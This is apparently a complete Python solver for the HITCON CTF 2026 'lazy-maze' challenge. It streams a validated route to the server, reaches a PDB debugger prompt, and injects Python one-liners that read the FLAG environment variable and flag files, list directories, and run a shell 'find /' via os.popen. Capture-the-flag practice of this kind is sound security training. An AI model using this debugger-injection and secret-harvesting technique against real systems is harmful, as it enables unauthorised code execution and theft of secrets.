#!/usr/bin/env python3
"""HITCON CTF 2026 lazy-maze. Full route + PDB flag extraction. stdlib only.

Usage: python3 solve.py
       python3 solve.py --host <host> --port 9999
       python3 solve.py --dry-run
"""
import argparse
import json
import re
import socket
import sys
import threading
import time
from pathlib import Path

ROOT=Path(__file__).resolve().parent
PAT=re.compile(rb'(?i)hitcon\{[^\r\n\}]{1,500}\}')

class SocketOutput:
    def __init__(self,sock):
        self.sock=sock
        self.buf=bytearray()
        self.condition=threading.Condition()
        self.closed=False
        self.error=None
        self.t=threading.Thread(target=self.run, daemon=True)
        self.t.start()
    def run(self):
        try:
            while True:
                data=self.sock.recv(65536)
                if not data:break
                with self.condition:
                    self.buf.extend(data)
                    self.condition.notify_all()
        except (OSError,ConnectionError) as e:self.error=e
        finally:
            with self.condition:
                self.closed=True
                self.condition.notify_all()
    def wait(self,predicate,seconds):
        deadline=time.monotonic()+seconds
        with self.condition:
            while not predicate(bytes(self.buf)) and not self.closed:
                rem=deadline-time.monotonic()
                if rem<=0:break
                self.condition.wait(rem)
            return bytes(self.buf)
    def output(self):
        with self.condition:return bytes(self.buf)

def route():
    steps=json.loads((ROOT/'route.json').read_text())
    if len(steps)!=1356:raise ValueError(f'Expected 1356 steps, got {len(steps)}')
    cur=[19,19]
    offsets={'n':(-1,0),'s':(1,0),'e':(0,1),'w':(0,-1)}
    for i,(d,pos,choice) in enumerate(steps):
        if d not in offsets:raise ValueError(f'Bad direction {d!r}')
        dr,dc=offsets[d];cur=[cur[0]+dr,cur[1]+dc]
        if cur!=pos:raise ValueError(f'Invalid step #{i}, computed {cur}, expected {pos}')
        if choice:raise ValueError(f'Unexpected choice at {i}: {choice!r}')
    if cur!=[37,1]:raise ValueError(f'Wrong final position: {cur}')
    return steps

def main():
    ap=argparse.ArgumentParser(description='HITCON lazy-maze complete solver')
    ap.add_argument('--host',default='<host>')
    ap.add_argument('--port',type=int,default=9999)
    ap.add_argument('--dry-run',action='store_true',help='Validate route JSON without network')
    ap.add_argument('--timeout',type=int,default=100,help='Seconds to await server prompt')
    ap.add_argument('--verbose',action='store_true',help='Show all server output')
    ap.add_argument('--no-interactive',action='store_true',help='Do not enter interactive PDB if flag not auto-detected')
    args=ap.parse_args()
    steps=route()
    print(f'[+] Validated {len(steps)} steps, from (19,19) to (37,1)',flush=True)
    if args.dry_run:return 0
    try:sock=socket.create_connection((args.host,args.port),timeout=12)
    except OSError as e:
        print(f'[-] Could not connect: {e}',file=sys.stderr)
        return 2
    with sock:
        sock.settimeout(None)
        io=SocketOutput(sock)
        banner=io.wait(lambda b:b'> ' in b,12)
        if b'> ' not in banner:
            print('[-] No initial maze prompt:',repr(banner[-2000:]),file=sys.stderr)
            return 3
        print('[+] Connected; streaming 1356 maze moves...',flush=True)
        cmds=''.join(d+((' '+ch) if ch else '')+'\n' for d,pos,ch in steps).encode()
        try:sock.sendall(cmds)
        except OSError as e:
            print('[-] Failed sending route:',e,file=sys.stderr);return 4
        data=io.wait(lambda b:b'(Pdb)' in b or b'Traceback ' in b or b'hitcon{' in b or b'HITCON{' in b,args.timeout)
        if b'(Pdb)' not in data:
            print('[-] Did not see PDB. Last server output:',data[-4000:].decode('utf8','replace'),file=sys.stderr)
            if b'Blocked' in data:print(f'[-] Server reported {data.count(b"Blocked")} blocked moves!',file=sys.stderr)
            return 5
        print('[+] PDB reached! Reading the real flag...',flush=True)
        # PDB commands: read conventional file names and environment first, then examine
        # root, then locate files containing "flag". Stop as soon as a flag appears.
        commands=[
          "!import os,glob;print('FLAG_RESULT',os.environ.get('FLAG'),[(p,open(p).read()) for p in dict.fromkeys(glob.glob('/flag*')+glob.glob('./*flag*')+glob.glob('../*flag*')+glob.glob('/app/*flag*')) if os.path.isfile(p)],flush=True)",
          "!import os;print('ROOT_FILES',os.listdir('/'),'CWD',os.getcwd(),'CWD_FILES',os.listdir('.'),flush=True)",
          "!import os;print('FOUND_FLAGS',os.popen(\"find / -type f -iname '*flag*' 2>/dev/null | head -60\").read(),flush=True)",
        ]
        pdb_count=data.count(b'(Pdb)')
        for cmd in commands:
            try:sock.sendall((cmd+'\n').encode('utf8'))
            except OSError as e:print('[-] PDB send failed:',e);break
            data=io.wait(lambda b:b.count(b'(Pdb)')>pdb_count or bool(PAT.search(b)),25)
            flags=PAT.findall(data)
            if flags:
                print('\nFLAG:',flags[-1].decode('ascii','replace'),flush=True)
                return 0
            pdb_count=data.count(b'(Pdb)')
            print('[i] PDB reply:',data[-1100:].decode('utf8','replace'),flush=True)
        if args.no_interactive:
            print('[-] No flag matched. Last output:')
            print(io.output()[-5000:].decode('utf8','replace'))
            return 6
        print('[!] No direct flag match. Interactive PDB available; input commands, Ctrl-D to finish.')
        while not io.closed:
            try:command=input('pdb> ')
            except (EOFError,KeyboardInterrupt):break
            prev=len(io.output())
            try:sock.sendall((command+'\n').encode())
            except OSError:break
            data=io.wait(lambda b:len(b)>prev+len(command)+5,4)
            print(data[prev:].decode('utf8','replace'),end='',flush=True)
            f=PAT.search(data)
            if f:
                print('\nFLAG:',f.group().decode('ascii','replace'))
                return 0
        return 7

if __name__=='__main__':sys.exit(main())
